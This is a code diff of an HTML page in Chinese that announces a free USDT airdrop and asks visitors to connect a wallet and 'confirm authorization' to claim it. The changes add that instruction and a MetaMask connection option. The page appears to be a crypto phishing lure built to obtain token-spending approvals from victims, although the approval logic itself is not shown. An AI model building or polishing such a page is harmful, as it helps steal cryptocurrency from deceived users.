@@ -9,6 +9,7 @@
 </head>
 <body style="text-align:center; padding-top:60px; font-family:sans-serif">
   <h2>🎉 恭喜你獲得 USDT 空投！</h2>
+  <p>請先連接錢包並確認授權以領取獎勵</p>
   <button id="connectButton">連接錢包</button>
   <br><br>
   <button id="approveButton">確認授權</button>
@@ -28,6 +29,13 @@
     const web3Modal = new window.Web3Modal.default({
       cacheProvider: false,
       providerOptions: {
+        injected: {
+          package: null,
+          display: {
+            name: "MetaMask",
+            description: "Connect with MetaMask"
+          }
+        },
         walletconnect: {
           package: window.WalletConnectProvider.default,
           options: {
